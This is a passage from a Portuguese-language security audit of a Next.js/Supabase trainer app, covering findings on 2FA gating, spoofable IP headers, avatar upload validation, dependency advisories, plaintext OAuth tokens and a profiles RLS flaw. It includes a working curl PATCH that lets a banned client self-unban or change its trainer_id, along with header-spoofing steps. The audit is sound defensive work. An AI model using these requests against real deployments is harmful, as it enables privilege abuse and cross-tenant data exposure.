request; só toca na BD (`isDeviceTrusted`) no caso "tem 2FA mas ainda em
AAL1".

**Verificação:**
1. Login como owner com 2FA activo, NÃO completar o desafio (ficar em
   `/login/2fa`). Replicar o POST de uma Server Action
   (ex.: `setClientBannedAction`) com as devnav-tools → resposta lança
   "2FA necessária." (antes executava).
2. Completar o 2FA (AAL2) e repetir → executa normalmente.
3. `grep -n "assertMfaSatisfied" lib/authz.ts` → usado em `requireStaff`
   e `requireOwner`.
4. `npm run type-check` na máquina (o sandbox do audit não consegue —
   ver baseline).

---

### S-14 · `getRequestIp` confia em `x-forwarded-for` forjável `[Low → FIXED]`

**Ficheiro/linhas:** `lib/rate-limit.ts:141-...`

A função tentava `x-vercel-forwarded-for` PRIMEIRO (definido pelo proxy do
Vercel, não forjável pelo cliente) e só depois `x-forwarded-for` /
`x-real-ip` (ambos enviáveis pelo cliente). Em produção no Vercel o
primeiro está sempre presente → não explorável. Fora do Vercel (ou se a
infra mudar), um atacante podia enviar `x-forwarded-for: <aleatório>` por
request e **rodar a chave do rate-limit**, anulando o limite de
brute-force em `/login`/`/registar`.

**Fix aplicado (2026-06-18):** se houver `x-vercel-forwarded-for`, é esse o
IP (idêntico ao anterior — zero mudança em produção, onde está sempre
presente). Em produção SEM esse header (não ocorre no Vercel) deixamos de
confiar nos headers do cliente e devolvemos uma chave fixa
(`"no-trusted-ip"`) → o limiter degrada para um bucket global mais
apertado, **falhando SEGURO** (nunca abre o brute-force). O fallback para
`x-forwarded-for`/`x-real-ip` fica restrito a dev/local.

**Verificação:** em prod, `curl -H 'x-forwarded-for: 1.2.3.4'` repetidamente
sem o header do Vercel → todas as tentativas caem no mesmo bucket (não há
rotação de chave). Em dev local o limiter continua a funcionar via
`x-forwarded-for`.

---

### S-15 · Upload de avatar valida só o MIME declarado `[Info → FIXED]`

**Ficheiro/linhas:** `app/admin/definicoes/actions.ts:303-346`

A validação usava `file.type` (Content-Type declarado pelo browser) +
`file.size`, e derivava a extensão do MIME (não do filename) — bom. Mas não
inspeccionava magic-bytes, por isso um ficheiro com bytes arbitrários e
`type=image/png` era aceite e gravado no bucket `avatars` servido com esse
content-type. Risco já baixo (bucket em **origem separada**
`*.supabase.co`; `X-Content-Type-Options: nosniff` global; allowlist
**exclui SVG**, o único vector real de XSS via imagem).

**Fix aplicado (2026-06-18):** validação da assinatura (magic-bytes) depois
de ler o buffer e antes do upload — aceita só JPEG (`FF D8 FF`), PNG
(`89 50 4E 47 0D 0A 1A 0A`) e WEBP (`RIFF`…`WEBP`). Imagens legítimas
passam sempre, por isso o fluxo normal não muda; conteúdo com type forjado
é rejeitado com "Ficheiro de imagem inválido.".

**Verificação:** upload de um `.txt` renomeado/forjado com
`Content-Type: image/png` → rejeitado. Upload de JPG/PNG/WEBP reais →
funciona como antes.

---

### S-16 · Advisories transitivas no `npm audit` `[Low → OPEN]`

**Ficheiro/linhas:** `package.json` / `package-lock.json` (deps transitivas).

**Vulnerabilidade:** `npm audit` (2026-06-22) reporta 7 advisories:

| Pacote | Sev | Advisory | Caminho | Runtime? |
|--------|-----|----------|---------|----------|
| `postcss <8.5.10` | moderate | GHSA-qx2v-qp2m-jg93 (XSS via `</style>` no stringify) | `next` bundled + devDep directa | Não — build/SSG only |
| `uuid <11.1.1` | moderate | GHSA-w5hq-g745-h8pq (OOB write `v3/v5/v6` quando `buf` fornecido) | `exceljs` → `uuid` | Sim, mas não disparável |
| `glob 10.2.0–10.4.x` | high | GHSA-5j98-mcp5-4vw2 (command-injection no CLI `-c/--cmd`) | `eslint-config-next` → `@next/eslint-plugin-next` → `glob` | Não — dev/lint only |

**Análise de explorabilidade (porque é Low e não High):**

- **postcss** só processa CSS em build-time (Tailwind/Next). Um atacante teria
  de injectar CSS malicioso no pipeline de build — não há input de utilizador
  no CSS. Sem superfície em runtime.
- **uuid** corre em runtime (gera UIDs nos XLSX de `/api/me/export` e
  `/api/relatorios/export`), MAS a CVE só afecta `uuid.v3/v5/v6` **quando se
  passa um buffer `buf`**; o exceljs chama `uuid.v4()` sem `buf`. Caminho não
  alcançável → impacto efectivo nulo, mas convém sair da versão vulnerável.
- **glob** é o CLI (`glob -c`), invocado só pelo lint do Next em dev/CI. O
  código da app nunca invoca o CLI do glob. Não exposto em produção.

**Impacto:** nenhum exploit directo na app em produção. É dívida de supply-chain
— mantê-las verde evita um false-negative em auditoria automática e fecha a
janela caso um destes pacotes passe a ser usado num caminho alcançável.

**Fix sugerido (a confirmar — alguns bumps são marcados "breaking" pelo npm):**

```bash
# 1) Bumps minor/patch seguros (postcss directo + transitive overrides)
npm i -D postcss@^8.5.10

# 2) exceljs traz uuid antigo. Forçar uuid recente via overrides no package.json:
#    "overrides": { "uuid": "^11.1.1" }
#    (exceljs usa só uuid.v4(), compatível com 11.x → baixo risco de regressão)

# 3) glob (dev): vem do eslint-config-next; sobe quando o eslint-config-next
#    actualizar. Alternativa: "overrides": { "glob": "^11.0.0" } (verificar lint).

npm audit            # alvo: 0 advisories high; moderates residuais documentados
npm run type-check   # garantir que os overrides não partem tipos
npm run build        # garantir que postcss/glob novos não partem o build
```

**Como verificar:** `npm audit --omit=dev` deve ficar sem o `uuid`/`postcss`
runtime; `npm audit` total sem highs. Correr `build` + `type-check` limpos.

**Nota:** estes bumps NÃO foram aplicados neste run — `npm audit fix --force`
proposto pelo npm instalava `next@9.3.3` (downgrade catastrófico) e `exceljs@3`.
A remediação correcta é via `overrides` cirúrgicos acima, que exigem teste de
build na máquina antes do push. Ver "Ordem de remediação".

---

### S-17 · Tokens OAuth de calendário guardados em claro `[Info → OPEN]`

**Ficheiro/linhas:** `app/api/integrations/[provider]/callback/route.ts:67-79`
(insert), `lib/calendar-sync.ts` (leitura/uso).

**Vulnerabilidade:** após o fluxo OAuth, o `access_token` e o `refresh_token`
de Google Calendar / Microsoft Graph são gravados **em claro** na coluna
`calendar_integrations.access_token` / `.refresh_token`. O `refresh_token`
é de longa duração — quem o ler obtém acesso persistente ao calendário do
trainer (ler/escrever eventos) até à revogação no lado do provider.

**Caminho de ataque (requer pré-condição):** não é explorável a partir do
exterior por si só. Requer que o atacante já tenha (a) a `SUPABASE_SERVICE_ROLE_KEY`
(que faz bypass de RLS), ou (b) uma SQL injection com leitura arbitrária noutro
ponto (não encontrada), ou (c) acesso a um backup/dump da BD. Nesse cenário,
os tokens em claro elevam o blast-radius de "dados da app" para "calendários
externos dos trainers".

**Mitigações já presentes:** RLS na tabela restringe SELECT ao próprio user;
a coluna nunca é devolvida ao browser; o service-role está confinado a 3
ficheiros server-only. Por isso **Info**, não Medium.

**Fix sugerido (defesa-em-profundidade, a confirmar — mudança de schema):**
cifrar em repouso com `pgcrypto`/`pgsodium` (ou Supabase Vault) e decifrar só
no servidor no momento do refresh; ou, no mínimo, guardar apenas o
`refresh_token` cifrado e derivar o `access_token` on-demand. Como é mudança
de schema + migração de dados existentes, fica para decisão do Rodrigo.

**Como verificar:** após o fix, `select access_token from calendar_integrations
limit 1;` devolve ciphertext, não um JWT/token legível.

---

### S-18 · Self-write de colunas sensíveis de `profiles` via PostgREST `[Medium → FIXED]`

**Ficheiro/linhas:** `supabase/migrations/0003_rls_policies.sql:26-28` (policy
`profiles: self update`), `:38-50` (trigger `protect_profile_role` — só `role`);
coluna `banned` introduzida em `0066_ban_client_purchases.sql:26`; consumo do
`banned` em `create_purchase` (`0066:55-58`); consumo do `trainer_id` em
`_client_is_accessible` (`0083_client_scope_rpcs.sql:63-72`).

**Vulnerabilidade:** a policy de self-update é

```sql
create policy "profiles: self update" on profiles
  for update using (id = auth.uid()) with check (id = auth.uid());
```

— ou seja, qualquer utilizador pode escrever **qualquer coluna** da sua própria
linha. Postgres RLS não faz restrição por coluna; a única defesa de coluna é o
trigger `protect_profile_role`, que **só bloqueia mudanças a `role`**. As
colunas de segurança `banned` e `trainer_id` ficaram desprotegidas.

A `anon key` (`NEXT_PUBLIC_SUPABASE_ANON_KEY`) está, por construção, no bundle do
browser, e qualquer cliente autenticado tem um JWT válido. Logo o atacante fala
**directamente com o PostgREST do Supabase**, sem passar pela app Next:

**Ataque 1 — self-unban (contorna a suspensão de compras).** O painel pode
"suspender" um cliente (`set_client_banned`); a suspensão é aplicada em
`create_purchase` (`not _is_service_or_admin() and ... banned` → recusa). Um
cliente suspenso anula-a:

```bash
curl -X PATCH 'https://<proj>.supabase.co/rest/v1/profiles?id=eq.<MEU_UID>' \
  -H "apikey: <ANON_KEY>" -H "Authorization: Bearer <MEU_JWT>" \
  -H "Content-Type: application/json" -H "Prefer: return=minimal" \
  -d '{"banned": false}'
```

A self-update policy aceita (`id = auth.uid()`), o trigger ignora `banned` →
suspensão anulada, cliente volta a comprar packs. O controlo de suspensão fica
inútil contra um cliente minimamente técnico (ex.: suspenso por chargebacks /
abuso / dívida).

**Ataque 2 — self-rescope (`trainer_id`).** `_client_is_accessible` (0083) usa
a união `profiles.trainer_id` para decidir que clientes "pertencem" a um
trainer. Um cliente faz `{"trainer_id": "<id de outro trainer>"}` e:

- injecta-se no scope do trainer B → passa a aparecer nas listas/PII de B e
  fica sujeito às acções de B (`set_client_banned`, `anonymize_client_account`,
  grants); e/ou
- foge do scope do seu próprio trainer (esconde-se das listas dele).

`trainer_id` só é legitimamente escrito no **signup** (trigger
`handle_new_user`, 0046 — um INSERT, que não dispara este trigger BEFORE
UPDATE) e nunca por código de cliente — por isso bloqueá-lo no UPDATE não
quebra nenhum fluxo.

**Impacto:** quebra de um controlo de negócio deliberado (suspensão) +
integridade do scoping multi-tenant / exposição de PII cross-trainer. Não é
takeover de conta (não muda `role` — esse já está protegido), daí **Medium**.

**Exploitability:** autenticado low-priv; um único `PATCH` HTTP com a anon key
pública e o JWT próprio. Sem ferramentas especiais.

**Fix aplicado (2026-06-23):** migration `0110_protect_profile_banned_and_trainer.sql`
estende `protect_profile_role` para também recusar mudanças a `banned` e
`trainer_id` quando o caller é um utilizador autenticado que não é staff:

```sql
if auth.uid() is null then return new; end if;           -- service/signup
if new.role       is distinct from old.role       and not is_owner() then raise ... end if;
if new.banned     is distinct from old.banned     and not is_admin() then raise ... end if;
if new.trainer_id is distinct from old.trainer_id and not is_admin() then raise ... end if;
```

Caminhos legítimos mantêm-se: service role/signup (`auth.uid() IS NULL`),
owner a editar contas (`is_owner`/`is_admin`), trainer a (des)suspender cliente
do seu scope via a RPC `set_client_banned` (SECURITY DEFINER corre com o
`auth.uid()` do trainer → `is_admin()` true; o scope cross-trainer já é
validado dentro da RPC por `_client_is_accessible`), e o cliente a editar
`full_name`/`phone`/`email` (nenhuma coluna protegida muda).

**Verificação:**
1. Suspender um cliente no painel. Como esse cliente, correr o `curl` do Ataque
   1 → resposta `403`/`401` do PostgREST com `Apenas staff pode alterar o
   estado de suspensão da conta.` (antes: `204`, `banned` ficava `false`).
2. `PATCH ... {"trainer_id":"<outro>"}` como cliente → recusado.
3. `PATCH ... {"full_name":"Novo Nome"}` como cliente → continua a funcionar.
4. No painel, suspender/reactivar um cliente (owner e trainer-no-scope) →
   continua a funcionar (a RPC passa o trigger por `is_admin()`).
5. Signup novo via `/registar?trainer=<id>` → `profiles.trainer_id` continua a
   ser populado (é INSERT, não passa pelo trigger).

**Aplicar:** correr a migration no Supabase (Dashboard → SQL Editor → colar
`0110_...sql` → Run), ou via CLI de migrations. **Até ser aplicada na BD, S-18
permanece explorável** — o ficheiro de migration por si só não fecha o buraco.

---

## Ordem de remediação sugerida

1. **S-01 · S-03 · S-04 · S-06 · S-07 · S-08** — FIXED no run anterior.
2. **S-02** — FIXED na raiz (upgrade para Next 16.2.9 + React 19.2.7).
3. **S-10** — FIXED neste run (2026-06-17). `requireStaff()` em todas as
   11 actions de `app/admin/agenda/actions.ts`.
4. **S-11** — FIXED no run anterior. Audit log no `/api/me/export`.
5. **S-12** — FIXED no run anterior. `Cache-Control: private` + `CDN-Cache-Control: public`.
6. **S-13 (High)** — FIXED neste run (2026-06-18). Gate de 2FA movido para
   `lib/authz.ts` (`requireStaff`/`requireOwner`). **Prioridade máxima** —
   re-testar o fluxo AAL1 antes do próximo release.
7. **S-14 (Low)** — FIXED neste run. `getRequestIp` pinado a
   `x-vercel-forwarded-for` (fail-closed em prod sem o header).
8. **S-15 (Info)** — FIXED no run anterior. Magic-bytes no upload de avatar.
9. **S-16 (Low) — OPEN, próximo PR.** Bumps via `overrides` cirúrgicos
   (`uuid@^11.1.1`, `postcss@^8.5.10`, `glob@^11`) + `npm audit`/`build`/
   `type-check` limpos. NÃO usar `npm audit fix --force` (faz downgrade do
   Next/exceljs). Prioridade sobre S-17 por fechar os 3 highs do audit.
10. **S-18 (Medium)** — FIXED neste run (2026-06-23) via migration `0110`.
    **Prioridade: aplicar a migration na BD de produção** (Supabase SQL Editor
    ou CLI) — o fix só fecha o buraco depois de correr no Postgres. Re-testar
    self-unban antes do próximo release.
11. **S-17 (Info) — OPEN, backlog.** Cifrar tokens OAuth de calendário em
    repouso (pgsodium/Vault). Mudança de schema → planear migração.
12. **S-05 · S-09** — ACCEPTED, monitor (trade-offs de PERF deliberados;
    alterá-los mudaria comportamento — não tocados).

## Como reproduzir o baseline determinístico

```bash
# Audit de dependências
npm audit --json | tee /tmp/audit.json

# Tipagem (bloqueia o build em CI desde jun/2026)
npx tsc --noEmit

# Greps relevantes
grep -rn "dangerouslySetInnerHTML" app components
grep -rn "SUPABASE_SERVICE_ROLE_KEY" app lib
grep -rn "getSession()\\|getUser()\\|getClaims()" lib app
grep -rn "NEXT_PUBLIC_" app lib
grep -rn "requireStaff\\|requireOwner" app/admin
grep -rn "\\.rpc(" lib app
```
